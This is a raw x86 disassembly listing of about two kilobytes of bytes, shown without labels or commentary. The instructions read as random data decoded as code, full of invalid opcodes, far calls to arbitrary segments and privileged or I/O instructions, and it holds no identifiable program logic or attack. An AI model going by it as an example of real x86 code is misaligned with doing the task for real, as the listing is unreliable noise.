  4430e9:	cmp    BYTE PTR [ecx+ecx*4],al
  4430ec:	mov    dl,0x11
  4430ee:	mov    dh,0xc4
  4430f0:	dec    ebp
  4430f1:	jmp    0x84929d8
  4430f6:	add    DWORD PTR [edx+0x2a],edx
  4430f9:	xchg   esp,eax
  4430fa:	xlat   BYTE PTR ds:[ebx]
  4430fb:	mov    al,0x72
  4430fd:	add    BYTE PTR [eax-0x5ccb4d52],cl
  443103:	icebp  
  443104:	and    edi,0x58
  443107:	nop
  443108:	jbe    0x443112
  44310a:	mov    ebp,0x7e1827ca
  44310f:	push   cs
  443110:	bound  ebp,QWORD PTR [ebp-0x32b9caea]
  443116:	call   0xcc04:0x346a50ea
  44311d:	jl     0x4430b6
  44311f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443120:	in     al,dx
  443121:	cli    
  443122:	pop    edx
  443123:	xchg   esp,eax
  443124:	jo     0x44314e
  443126:	pop    eax
  443127:	aam    0x3d
  443129:	sar    ebp,cl
  44312b:	push   es
  44312c:	les    edi,FWORD PTR [ebx-0x11]
  44312f:	mov    dl,0xe1
  443131:	adc    ch,cl
  443133:	dec    ecx
  443134:	mov    dl,0xbd
  443136:	pusha  
  443137:	outs   dx,DWORD PTR ds:[esi]
  443138:	loop   0x44319e
  44313a:	sbb    BYTE PTR [eax],0x91
  44313d:	inc    ebx
  44313e:	sahf   
  44313f:	xchg   esi,eax
  443140:	mov    dl,0xa1
  443142:	dec    ecx
  443143:	aas    
  443144:	jmp    0x62d4:0xb275e4f7
  44314b:	fstp   QWORD PTR [edi-0x44b5c45c]
  443151:	cmc    
  443152:	rcr    DWORD PTR [edx+0x1e9a3952],1
  443158:	inc    eax
  443159:	rcl    al,0x78
  44315c:	push   ecx
  44315d:	sub    al,0x91
  44315f:	jns    0x4430ee
  443161:	call   0x4e5b:0xb485fdd
  443168:	jo     0x443198
  44316a:	sbb    BYTE PTR [edx+esi*2-0x208965bc],bh
  443171:	test   eax,0x381243ca
  443176:	jno    0x44311f
  443178:	cs je  0x4431b4
  44317b:	sub    esp,DWORD PTR [ecx-0x42be6029]
  443181:	ins    BYTE PTR es:[edi],dx
  443182:	stc    
  443183:	mov    edx,0x9b354b6b
  443188:	xor    esp,0xffffffbc
  44318b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44318c:	clc    
  44318d:	or     al,0x13
  44318f:	outs   dx,BYTE PTR ds:[esi]
  443190:	mov    edx,0xb2bd6e0e
  443195:	rcl    DWORD PTR [ebx+0x28055fcd],0x30
  44319c:	jl     0x443219
  44319e:	iret   
  44319f:	rcr    DWORD PTR [ebx+ecx*1+0x5d],1
  4431a3:	add    edi,DWORD PTR [ebp-0x4e]
  4431a6:	add    al,0x7a
  4431a8:	sub    BYTE PTR [edx-0x76663866],bl
  4431ae:	std    
  4431af:	mov    al,ds:0xa81ffd1d
  4431b4:	fnstsw WORD PTR [eax]
  4431b6:	imul   BYTE PTR [esi+0x7c]
  4431b9:	lods   eax,DWORD PTR ds:[esi]
  4431ba:	(bad)  
  4431bb:	es pop ss
  4431bd:	out    dx,al
  4431be:	pop    esi
  4431bf:	mov    bh,0x21
  4431c1:	jmp    FWORD PTR [esi+edx*2]
  4431c4:	mov    dl,0xf9
  4431c6:	stos   BYTE PTR es:[edi],al
  4431c7:	pop    eax
  4431c8:	fdivp  st(5),st
  4431ca:	jae    0x44314e
  4431cc:	das    
  4431cd:	or     edx,DWORD PTR ds:0x26306523
  4431d3:	pop    esp
  4431d4:	sahf   
  4431d5:	sbb    eax,0x3103ea9a
  4431da:	jbe    0x4431ef
  4431dc:	retf   
  4431dd:	retf   0xa729
  4431e0:	or     ch,BYTE PTR [ebp-0x17]
  4431e3:	lods   al,BYTE PTR ds:[esi]
  4431e4:	popa   
  4431e5:	vsqrtsd xmm6,xmm0,QWORD PTR [ebx-0x3fd7d8c7]
  4431ed:	sbb    al,0xa9
  4431ef:	xor    DWORD PTR [edx-0x9],ebp
  4431f2:	dec    esi
  4431f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4431f4:	mov    WORD PTR [ebx],?
  4431f6:	rcr    ch,0xb4
  4431f9:	arpl   WORD PTR [edi],dx
  4431fb:	pop    esp
  4431fc:	lods   al,BYTE PTR ds:[esi]
  4431fd:	(bad)  ds:0xaf4bb242
  443203:	fsubp  st(1),st
  443205:	inc    esi
  443206:	cs mov edi,0x33a4bc0f
  44320c:	or     al,BYTE PTR [edx-0x54807963]
  443212:	sbb    BYTE PTR [edx+eiz*1],ah
  443215:	ror    DWORD PTR [esi+0x22],1
  443218:	ja     0x44322e
  44321a:	es popf 
  44321c:	jne    0x44326c
  44321e:	cmp    ah,bh
  443220:	ins    DWORD PTR es:[edi],dx
  443221:	loope  0x44327d
  443223:	ss mov ecx,0xdca618f0
  443229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44322a:	pop    ebx
  44322b:	call   0xe521:0x532db977
  443232:	call   0x4661:0x1ec0157
  443239:	push   ss
  44323a:	(bad)  
  44323b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44323c:	sti    
  44323d:	jg     0x44323b
  44323f:	or     eax,0xff4fb05a
  443244:	cli    
  443245:	iret   
  443246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443248:	mov    esi,0x3a78028b
  44324d:	(bad)  
  44324e:	mov    edi,0x81855a7
  443253:	ds pop ebx
  443255:	jmp    0xc98f:0xdfb5bd6f
  44325c:	(bad)  
  44325d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44325e:	sbb    cl,BYTE PTR [edi-0x5962d599]
  443264:	mov    bh,0x5c
  443266:	es jg  0x443271
  443269:	div    DWORD PTR ds:0x9a663c6f
  44326f:	out    dx,eax
  443270:	add    eax,0x542a580a
  443275:	inc    esi
  443276:	mov    ds:0x487113a7,al
  44327b:	pop    edi
  44327c:	stos   DWORD PTR es:[edi],eax
  44327d:	xor    al,BYTE PTR [edi+0x1a0cb2de]
  443283:	call   0xcf6c5baf
  443288:	lods   eax,DWORD PTR ds:[esi]
  443289:	sbb    BYTE PTR [edx],al
  44328b:	les    edi,FWORD PTR [esi+0xb]
  44328e:	inc    esp
  44328f:	(bad)  
  443290:	sti    
  443291:	add    bh,BYTE PTR [eax]
  443293:	sbb    BYTE PTR [edx+0x4a083a5e],dh
  443299:	inc    ebx
  44329a:	push   ebx
  44329b:	jae    0x44326a
  44329d:	or     al,dh
  44329f:	(bad)  
  4432a0:	shl    DWORD PTR [edi+edx*4],cl
  4432a3:	push   eax
  4432a4:	and    eax,0x231a9f7b
  4432a9:	into   
  4432aa:	call   0x9219:0x143b7522
  4432b1:	mov    sp,0x6017
  4432b5:	or     al,0xdf
  4432b7:	push   0x778a4d67
  4432bc:	or     dh,BYTE PTR [eax]
  4432be:	fisttp QWORD PTR [ecx]
  4432c0:	mov    dl,0x51
  4432c2:	jg     0x4432dd
  4432c4:	int3   
  4432c5:	ret    
  4432c6:	adc    BYTE PTR [ebp-0x6fc7f4fb],ch
  4432cc:	lock pop ebp
  4432ce:	adc    al,0x51
  4432d0:	test   al,0x92
  4432d2:	(bad)  
  4432d3:	lds    edi,FWORD PTR [edi+0x8]
  4432d6:	add    cl,BYTE PTR [ebp+0x4f73a35c]
  4432dc:	inc    esi
  4432dd:	pop    es
  4432de:	shr    BYTE PTR [ecx-0x3903fe33],1
  4432e4:	in     al,dx
  4432e5:	rol    BYTE PTR [ebx+0x790b4dc4],0x54
  4432ec:	std    
  4432ed:	aad    0x41
  4432ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4432f0:	mov    ah,0x7d
  4432f2:	mov    ebp,0x152a9c53
  4432f7:	test   eax,0x3dfeecbd
  4432fc:	fsubr  st,st(3)
  4432fe:	les    edx,FWORD PTR [eax]
  443300:	inc    eax
  443301:	aas    
  443302:	dec    ebp
  443303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443304:	cwde   
  443305:	cli    
  443306:	dec    edx
  443307:	inc    ecx
  443308:	mov    ebx,DWORD PTR [esi-0x1e4dde1a]
  44330e:	inc    eax
  44330f:	and    BYTE PTR [ebp+ecx*8-0x5e],bh
  443313:	cmp    al,bh
  443315:	or     esp,DWORD PTR [eax+esi*1]
  443318:	push   ss
  443319:	dec    edi
  44331a:	dec    eax
  44331b:	sub    DWORD PTR [ebp+ebp*2-0x66],ecx
  44331f:	in     eax,0x83
  443321:	shl    BYTE PTR [ebx-0x78],1
  443324:	or     BYTE PTR [eax-0x76],ah
  443327:	out    dx,eax
  443328:	jno    0x44332a
  44332a:	xchg   bh,ch
  44332c:	hlt    
  44332d:	dec    ebx
  44332e:	mov    ah,0xb6
  443330:	fwait
  443331:	inc    esi
  443332:	and    al,0x3a
  443334:	mov    esp,0x53e41b89
  443339:	stos   DWORD PTR es:[edi],eax
  44333a:	push   es
  44333b:	push   eax
  44333c:	and    DWORD PTR [ecx-0x16ad45b3],esp
  443342:	sbb    eax,0x4cc6f2e7
  443347:	popf   
  443348:	mov    esi,esi
  44334a:	call   0x2f30:0xdc145fe5
  443351:	imul   esi,DWORD PTR [eax-0x59],0x52a28074
  443358:	cwde   
  443359:	mov    ecx,0xdbaee4c1
  44335e:	inc    edx
  44335f:	jp     0x443313
  443361:	in     al,dx
  443362:	adc    al,0x49
  443364:	mov    esi,0x75a778a2
  443369:	clc    
  44336a:	mov    WORD PTR [ebx],cs
  44336c:	mov    ds:0xb275ac3e,eax
  443371:	je     0x4433c4
  443373:	cld    
  443374:	iret   
  443375:	es dec esp
  443377:	and    esp,esi
  443379:	or     esp,DWORD PTR [edx+0x456b5e86]
  44337f:	ret    
  443380:	cmp    esp,DWORD PTR [eax]
  443382:	call   0xd59e:0x918854cc
  443389:	(bad)  
  44338a:	cmp    eax,0xab0b6543
  44338f:	out    dx,eax
  443390:	enter  0x312e,0xc4
  443394:	imul   ebx,DWORD PTR [ebx-0x66],0xffffff9b
  443398:	fistp  DWORD PTR [edi+edi*1-0x7c82d6b5]
  44339f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4433a0:	loopne 0x443344
  4433a2:	sub    eax,0xddfb66dc
  4433a7:	cld    
  4433a8:	mov    dl,0x71
  4433aa:	(bad)  
  4433ab:	dec    ecx
  4433ac:	push   ebp
  4433ad:	jg     0x44335b
  4433af:	sub    DWORD PTR ds:0x4153069b,eax
  4433b6:	pop    edx
  4433b7:	pop    ebx
  4433b8:	jg     0x443434
  4433ba:	push   esp
  4433bb:	dec    eax
  4433bc:	inc    esi
  4433bd:	fcomp  QWORD PTR [edx+0x22ffb8e3]
  4433c3:	mov    es,WORD PTR [ecx]
  4433c5:	sbb    eax,0x4cc6a7b7
  4433ca:	xor    BYTE PTR [ebp+0x1c],bh
  4433cd:	pop    esp
  4433ce:	jmp    0x44337f
  4433d0:	mov    ebx,0xd2a9e08a
  4433d5:	mov    edi,DWORD PTR [esi-0x527fa5a7]
  4433db:	mov    edx,0x241c8746
  4433e0:	pop    ebx
  4433e1:	xlat   BYTE PTR ds:[ebx]
  4433e2:	iret   
  4433e3:	mov    esp,0xcd18955a
  4433e8:	mov    dl,0xfa
  4433ea:	xor    BYTE PTR [esi],bl
  4433ec:	pop    ss
  4433ed:	es sub eax,0x540c8a7a
  4433f3:	jmp    0x806e:0x78712e2
  4433fa:	sbb    eax,0x9a275c51
  4433ff:	mov    dh,0x50
  443401:	lock dec edx
  443403:	popf   
  443404:	aaa    
  443405:	mov    edx,0xb954bb1
  44340a:	jge    0x4433fb
  44340c:	ror    DWORD PTR es:[esp+eax*1-0x2f6544f1],1
  443414:	retf   
  443415:	add    DWORD PTR [eax],ecx
  443417:	adc    dh,BYTE PTR [ecx]
  443419:	es je  0x4433c3
  44341c:	jae    0x4433f5
  44341e:	aam    0x14
  443420:	pusha  
  443421:	xor    al,0x87
  443423:	sub    DWORD PTR [ebx-0xfaf41f0],esi
  443429:	and    eax,edi
  44342b:	inc    bl
  44342d:	cmc    
  44342e:	dec    esi
  44342f:	pop    edi
  443430:	ret    0x70b
  443433:	adc    al,0x95
  443435:	call   0x64a7:0x1e8068d
  44343c:	fmul   QWORD PTR [ebx]
  44343e:	inc    edi
  44343f:	and    al,0x42
  443441:	mov    esi,0xa1d1c57
  443446:	push   esp
  443447:	sbb    ah,BYTE PTR [eax]
  443449:	push   eax
  44344a:	jmp    0xb24b:0xa43b6747
  443451:	inc    ebx
  443452:	fst    DWORD PTR [ecx-0x44]
  443455:	scas   al,BYTE PTR es:[edi]
  443456:	mov    edx,0x6a6b2b06
  44345b:	dec    esi
  44345c:	mov    ebx,tr6
  44345f:	in     al,dx
  443460:	mov    dl,0xbe
  443462:	jae    0x44347f
  443464:	fst    QWORD PTR [esi+0xb126987]
  44346a:	in     al,dx
  44346b:	gs mov esi,0x8cd4947a
  443471:	cs call 0x34bf:0xe79c04e0
  443479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44347a:	inc    esp
  44347b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44347c:	(bad)  
  44347d:	sub    al,0x79
  44347f:	ins    BYTE PTR es:[edi],dx
  443480:	(bad)  [ebx+edx*2+0x4]
  443484:	mov    edi,esi
  443486:	mov    cl,0x1f
  443488:	out    dx,al
  443489:	or     esp,edx
  44348b:	aam    0x1b
  44348d:	ficomp DWORD PTR [ebp+0x4a0bf3b4]
  443493:	jmp    0x4434d6
  443495:	mov    dh,0x26
  443497:	or     eax,0xe59a2b2f
  44349c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44349d:	mov    ds:0x95df7910,eax
  4434a2:	(bad)  
  4434a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4434a4:	cli    
  4434a5:	inc    eax
  4434a6:	out    dx,eax
  4434a7:	xchg   al,ch
  4434a9:	shr    BYTE PTR [ebx-0x37b05373],1
  4434af:	cmp    dl,dh
  4434b1:	sub    al,0x9e
  4434b4:	add    al,0xa0
  4434b6:	in     eax,dx
  4434b7:	push   edi
  4434b8:	mov    cs,WORD PTR [ebx]
  4434ba:	(bad)  
  4434bb:	sub    bl,BYTE PTR [ebp+0x3cf6c360]
  4434c1:	stos   BYTE PTR es:[edi],al
  4434c2:	call   0x3e82:0xbb0e849d
  4434c9:	jmp    0x10e3:0x6931a7bd
  4434d0:	icebp  
  4434d1:	pop    edi
  4434d2:	(bad)  [eax]
  4434d4:	mov    cl,0x98
  4434d6:	jbe    0x443506
  4434d8:	mov    BYTE PTR [ebx],bh
  4434da:	mov    al,0x2f
  4434dc:	push   edx
  4434dd:	or     DWORD PTR [eax-0x59],ebp
  4434e0:	jo     0x44348e
  4434e2:	repz jbe 0x443561
  4434e5:	xchg   esi,eax
  4434e6:	mov    dl,dh
  4434e8:	mov    DWORD PTR [ecx+0x6c66a74c],esi
  4434ee:	(bad)  
  4434f0:	pop    ecx
  4434f1:	iret   
  4434f2:	rcr    DWORD PTR [ebp+0x3d9f6341],cl
  4434f8:	ds inc esp
  4434fa:	sub    eax,0xb005fe27
  4434ff:	sbb    BYTE PTR [edx+0x633f076a],dh
  443505:	sbb    eax,0xb2c2675
  44350a:	sbb    dh,BYTE PTR [eax+0x31]
  44350d:	and    BYTE PTR [ecx-0x70],0x3e
  443511:	jbe    0x4434ad
  443513:	scas   eax,DWORD PTR es:[edi]
  443514:	scas   al,BYTE PTR es:[edi]
  443515:	aam    0x4e
  443517:	hlt    
  443518:	mul    ah
  44351a:	adc    eax,0xb2be34a4
  44351f:	pop    eax
  443520:	pop    ds
  443521:	push   cs
  443522:	push   edx
  443523:	push   ecx
  443524:	jmp    0x9829b93b
  443529:	clc    
  44352a:	sbb    BYTE PTR [ecx+esi*1-0x50],bh
  44352e:	addr16 fs jae 0x4434f5
  443532:	mov    eax,0x790b8dd1
  443537:	sbb    ch,ah
  443539:	loope  0x443576
  44353b:	test   al,0x3a
  44353d:	sbb    BYTE PTR [esi+0x5a33200a],cl
  443543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443544:	jnp    0x443505
  443546:	pop    ebx
  443547:	mov    DWORD PTR [esi+ecx*4+0x71],edi
  44354b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44354c:	inc    ebx
  44354d:	dec    edi
  44354e:	pop    ebp
  44354f:	mov    WORD PTR [ecx-0xe],fs
  443552:	cmp    al,0xbd
  443554:	cmp    BYTE PTR [esi],0xbf
  443557:	arpl   WORD PTR [esi+0x2facae08],di
  44355d:	pop    edx
  44355e:	in     al,dx
  44355f:	xchg   BYTE PTR [edx+0x5e80b285],dh
  443565:	jno    0x4435d7
  443567:	push   ebx
  443568:	mov    dl,0xa4
  44356a:	jge    0x4435b8
  44356c:	sbb    edx,edx
  44356e:	cs aaa 
  443570:	push   esp
  443571:	add    BYTE PTR [edi],bh
  443573:	std    
  443574:	mov    cl,0x20
  443576:	call   0xbc75:0xae14f9ae
  44357d:	hlt    
  44357e:	ret    0xf524
  443581:	jmp    0x4435cf
  443583:	je     0x443599
  443585:	cmp    al,0x42
  443587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443588:	mov    ebp,0xee5bca55
  44358d:	xchg   edi,eax
  44358e:	add    DWORD PTR [ecx],edx
  443590:	mov    ch,0xa5
  443592:	addr16 fucom st(5)
  443595:	daa    
  443596:	jp     0x443570
  443598:	dec    ebx
  443599:	xlat   BYTE PTR ds:[ebx]
  44359a:	sub    ah,BYTE PTR [edi+0xfb5a7f7]
  4435a0:	cs in  eax,0x3e
  4435a3:	test   BYTE PTR [ebp+ebx*2+0x53cfa7c0],cl
  4435aa:	imul   DWORD PTR [edi+0x7c]
  4435ad:	leave  
  4435ae:	out    dx,eax
  4435af:	mov    eax,0x676a830b
  4435b4:	mov    al,ds:0x27086c08
  4435b9:	les    esi,FWORD PTR [ecx+ecx*1-0x4e]
  4435bd:	jo     0x44356a
  4435bf:	std    
  4435c0:	inc    ebx
  4435c1:	pop    esp
  4435c2:	xchg   esi,eax
  4435c3:	cmp    DWORD PTR [edi+0xe9f10ff],ecx
  4435c9:	dec    ecx
  4435ca:	sbb    dh,BYTE PTR [edx+ebx*1-0x723d3982]
  4435d1:	cmp    bl,BYTE PTR [edx+0x1d430b08]
  4435d7:	pop    ecx
  4435d8:	fnstsw WORD PTR [edi+0x2503a7ae]
  4435de:	add    eax,0x9489f0d
  4435e3:	push   edi
  4435e4:	mov    bl,0xf2
  4435e6:	inc    eax
  4435e7:	fisttp WORD PTR [edx-0x2d9ef5e5]
  4435ed:	mov    ebp,0xbb3da45a
  4435f2:	xchg   ecx,eax
  4435f3:	ins    DWORD PTR es:[edi],dx
  4435f4:	cmp    eax,esi
  4435f6:	sbb    eax,0x7715ecc7
  4435fb:	lods   eax,DWORD PTR ss:[esi]
  4435fd:	push   esi
  4435fe:	push   edx
  4435ff:	bnd jb 0x4435de
  443602:	xchg   edi,eax
  443603:	or     DWORD PTR [ebx-0x315802a8],edx
  443609:	and    esp,ebp
  44360b:	sbb    al,0xbb
  44360d:	or     BYTE PTR [edx-0x7aa5a3f],ch
  443613:	jp     0x4435c7
  443615:	ins    BYTE PTR es:[edi],dx
  443616:	arpl   WORD PTR [esi+ebx*2+0x7b],ax
  44361a:	dec    ebp
  44361b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44361c:	dec    ecx
  44361d:	cmp    eax,0x3a64ec38
  443622:	or     ah,BYTE PTR [edi]
  443624:	push   es
  443625:	outs   dx,BYTE PTR ds:[esi]
  443626:	call   0x50e8:0x18230f64
  44362d:	pop    eax
  44362e:	lods   al,BYTE PTR ds:[esi]
  44362f:	mov    edx,0x67a81b31
  443634:	clc    
  443635:	cmp    ebx,edx
  443637:	xchg   al,bl
  443639:	stos   DWORD PTR es:[edi],eax
  44363a:	call   0xe04f:0x7f2dee40
  443641:	popf   
  443642:	(bad)  [edi+0x7f971ad0]
  443648:	sub    esi,eax
  44364a:	ds pop edi
  44364c:	dec    esp
  44364d:	loopne 0x4435e9
  44364f:	rcl    dl,cl
  443651:	add    edx,edx
  443653:	xor    DWORD PTR [esi+0xe],esp
  443656:	or     ebx,ebx
  443658:	sub    eax,0x6fad80b
  44365d:	fld    DWORD PTR [ebx-0x66e9ff5c]
  443663:	mov    bh,0x48
  443665:	aad    0xf8
  443667:	cmp    edi,DWORD PTR [ebp-0x15]
  44366a:	rcr    esi,cl
  44366c:	mov    ebp,0x83ec450a
  443671:	imul   edi,esi,0x7c
  443674:	jl     0x443601
  443676:	in     al,0xea
  443678:	stos   BYTE PTR es:[edi],al
  443679:	sub    eax,0xf57e534
  44367e:	mov    ch,0x66
  443680:	bound  edi,QWORD PTR [eax-0x3be0d8ec]
  443686:	push   ecx
  443687:	test   eax,0x1c9ab558
  44368c:	cld    
  44368d:	push   0x965e3216
  443692:	mov    DWORD PTR [edi-0x750ae307],esp
  443698:	add    DWORD PTR ds:0xe6b2cf52,esi
  44369e:	arpl   WORD PTR [esi+0x7e],di
  4436a1:	xchg   edi,ecx
  4436a3:	mov    al,dl
  4436a5:	or     BYTE PTR [eax+0x697dcfe5],bh
  4436ab:	mov    edx,0x5f23d372
  4436b0:	rcr    DWORD PTR [ecx-0x66],0xc9
  4436b4:	cmp    eax,0x93f6fe9a
  4436b9:	dec    eax
  4436ba:	mov    DWORD PTR [edi+0x5af83a26],esp
  4436c0:	sti    
  4436c1:	jmp    0xd1f542bf
  4436c6:	jmp    0x5b9d1b6b
  4436cb:	inc    edx
  4436cc:	xor    dh,bl
  4436ce:	inc    esp
  4436cf:	mov    bl,0xab
  4436d1:	or     BYTE PTR [eax+0x18af725f],dl
  4436d7:	shl    DWORD PTR [edx-0x10],cl
  4436da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4436db:	mov    bh,0xa5
  4436dd:	in     eax,0x1c
  4436df:	cmp    al,0x52
  4436e1:	mov    bh,BYTE PTR [eax-0x7ad86dc1]
  4436e7:	xchg   ecx,eax
  4436e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4436e9:	or     BYTE PTR [edx+0x1a043b9],dl
  4436ef:	mov    al,0x52
  4436f1:	mov    dl,dl
  4436f3:	into   
  4436f4:	pop    esp
  4436f5:	test   eax,0x1440d39a
  4436fa:	into   
  4436fb:	or     esp,DWORD PTR [ecx+edi*4]
  4436fe:	jecxz  0x4436a7
  443700:	data16 icebp 
  443702:	ins    DWORD PTR es:[edi],dx
  443703:	sbb    eax,0x69fdafab
  443708:	mov    dl,0xc
  44370a:	or     dl,BYTE PTR [esi+0x79]
  44370d:	test   al,0x15
  44370f:	pop    ecx
  443710:	test   BYTE PTR [ebx],cl
  443712:	inc    ebp
  443713:	idiv   BYTE PTR [edi+0x69a9c36e]
  443719:	call   0xbd29:0x4e51
  44371f:	add    DWORD PTR [edi-0x215891bd],esp
  443725:	push   ebx
  443726:	sub    dl,BYTE PTR [esi+0x2c]
  443729:	xor    DWORD PTR [ebx],0xdbb4b2d0
  44372f:	mov    bl,0xce
  443731:	or     ebx,ebp
  443733:	inc    ebp
  443734:	inc    esi
  443735:	or     esi,DWORD PTR [esi-0x23204236]
  44373b:	into   
  44373c:	nop
  44373d:	inc    esi
  44373e:	call   0xf29f:0x8156ea39
  443745:	imul   esi,DWORD PTR [eax],0xffffffa7
  443748:	in     al,dx
  443749:	mov    ebx,0x3c650fbc
  44374e:	xchg   esp,eax
  44374f:	fnstenv [esi-0x6eadb5f8]
  443755:	jnp    0x4437b1
  443757:	mov    dh,0x8c
  443759:	sub    BYTE PTR [ebx-0x29],0x93
  44375d:	or     ecx,DWORD PTR [eax]
  44375f:	cmc    
  443760:	lahf   
  443761:	jae    0x443791
  443763:	mov    edx,0x3491be4e
  443768:	xchg   esp,eax
  443769:	mov    al,0x2d
  44376b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44376c:	ja     0x4437a7
  44376e:	sar    BYTE PTR [ecx-0x6c5ef4d0],0x90
  443775:	enter  0xadc5,0x44
  443779:	xor    dl,BYTE PTR [eax+0x29cb3d8d]
  44377f:	addr16 mov dl,0x1c
  443782:	daa    
  443783:	daa    
  443784:	sub    eax,0xe3a48fc0
  443789:	pop    ss
  44378a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44378b:	or     eax,0x1f1a5caa
  443790:	or     al,0xa0
  443792:	mov    ah,0xde
  443794:	push   edx
  443795:	lock call 0xf814:0x557097fe
  44379d:	or     ah,BYTE PTR [ecx-0x4a]
  4437a0:	rol    BYTE PTR ds:0x7ba72870,0xd5
  4437a7:	or     cl,BYTE PTR [eax+0x4f]
  4437aa:	call   0x854a:0xda0886da
  4437b1:	int3   
  4437b2:	fld    TBYTE PTR [eax-0x2f3d412f]
  4437b8:	xor    ah,cl
  4437ba:	fmul   DWORD PTR [edx]
  4437bc:	push   esi
  4437bd:	sbb    bl,BYTE PTR [edx+0x13a1ce4]
  4437c3:	dec    edx
  4437c4:	dec    esp
  4437c5:	dec    edi
  4437c6:	push   esi
  4437c7:	lods   eax,DWORD PTR ds:[esi]
  4437c8:	jl     0x443777
  4437ca:	push   eax
  4437cb:	pop    ebx
  4437cc:	gs or  al,0xce
  4437cf:	pushf  
  4437d0:	ja     0x44378c
  4437d2:	sahf   
  4437d3:	lea    ebp,[edx+0x3b]
  4437d6:	add    DWORD PTR [ebx-0x3a],0xa9fb9a93
  4437dd:	sbb    al,0xba
  4437df:	nop
  4437e0:	out    0x75,eax
  4437e2:	and    esp,DWORD PTR [edi+0x7096f1c4]
  4437e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4437e9:	adc    esi,ecx
  4437eb:	fnstsw WORD PTR [ebp+0x64d484c7]
  4437f1:	retf   0x67ef
  4437f4:	cwde   
  4437f5:	retf   0x85ea
  4437f8:	jnp    0x443811
  4437fa:	aam    0x81
  4437fc:	(bad)  
  4437fd:	mov    eax,DWORD PTR [ebp-0x7275ff91]
  443803:	jo     0x4437b7
  443805:	scas   al,BYTE PTR es:[edi]
  443806:	fstp   DWORD PTR ds:0x7fdd2c1e
  44380c:	ud2    
  44380e:	jo     0x4437d8
  443810:	(bad)  
  443811:	xlat   BYTE PTR ds:[ebx]
  443812:	mov    al,0xb1
  443814:	repz xor ebx,DWORD PTR [eax-0xc4f99a4]
  44381b:	pop    edi
  44381c:	xchg   ecx,eax
  44381d:	imul   ebp,DWORD PTR [ecx],0xa
  443820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443821:	or     BYTE PTR [ebx],bh
  443823:	cdq    
  443824:	jne    0x443857
  443826:	jg     0x44385e
  443828:	cmp    dl,bl
  44382a:	and    bh,dl
  44382c:	mov    dl,0x3b
  44382e:	fstp   QWORD PTR [edx]
  443830:	ja     0x443803
  443832:	in     eax,0x2b
  443834:	jbe    0x443841
  443836:	mov    ch,0xdb
  443838:	dec    dx
  44383a:	and    eax,0xe61d3f02
  44383f:	outs   dx,BYTE PTR ds:[esi]
  443840:	mov    dl,0x26
  443842:	sub    BYTE PTR [edx-0xbb3624c],ah
  443848:	add    cl,BYTE PTR [ebx]
  44384a:	(bad)  
  44384b:	cdq    
  44384c:	sub    eax,0x62107904
  443851:	xchg   ebp,eax
  443852:	cwde   
  443853:	cld    
  443854:	xor    eax,DWORD PTR [ecx+0x7c]
  443857:	and    cl,BYTE PTR [eax+0x6b]
  44385a:	in     al,0x88
  44385c:	fidivr WORD PTR [esi-0xc7c8e06]
  443862:	call   0x4ce5:0x2fd2630b
  443869:	adc    al,0x83
  44386b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44386c:	mov    bl,0xe9
  44386e:	adc    DWORD PTR [ebx+edi*8-0x5],ecx
  443872:	popf   
  443873:	jnp    0x44386f
  443875:	dec    edi
  443876:	loopne 0x443840
  443878:	leave  
  443879:	sahf   
  44387a:	call   0x10ca:0xb2499db3
  443881:	push   edx
  443882:	mov    ds:0x9539bfa7,eax
  443887:	mov    esp,0xa4bd68c
  44388c:	mov    dl,0x4e
  44388e:	mov    ds,eax
  443890:	mov    esp,0x722eeb08
  443895:	or     edx,esp
  443897:	pushf  
  443898:	int3   
  443899:	sub    esi,DWORD PTR [eax+0x10]
  44389c:	mov    al,ds:0xbd5f9a39
  4438a1:	mov    WORD PTR ds:0x3f340426,?
  4438a7:	(bad)  
  4438a8:	mov    bh,0x5
  4438aa:	lds    esp,FWORD PTR [ecx+eax*8]
  4438ad:	or     bl,BYTE PTR [edx+0x214f1987]
  4438b3:	enter  0xcb2,0xf1
  4438b7:	or     DWORD PTR [edx+0x4b],esi
  4438ba:	inc    esp
  4438bb:	dec    edi
  4438bc:	adc    cl,BYTE PTR [ebx]
  4438be:	push   es
  4438bf:	mov    cl,0xaa
  4438c1:	jne    0x443932
  4438c3:	jnp    0x4438b0
  4438c5:	push   0xffffff88
  4438c7:	adc    ah,BYTE PTR [eax]
  4438c9:	and    eax,0xede9af9a
  4438ce:	ins    DWORD PTR es:[edi],dx
  4438cf:	loope  0x443932
  4438d1:	or     esi,edx
  4438d3:	sbb    DWORD PTR [ebx+0x39],ecx
  4438d6:	or     eax,0xd217b507
  4438db:	(bad)  
  4438dc:	pop    ds
  4438dd:	or     ecx,esi
  4438df:	outs   dx,DWORD PTR ds:[esi]
  4438e0:	mov    ebp,eax
  4438e2:	(bad)  
  4438e4:	out    dx,eax
  4438e5:	or     BYTE PTR [ebx-0x11fe3efa],bh
  4438eb:	pop    ecx
  4438ec:	xor    DWORD PTR [edx+esi*2-0x4140a249],edx
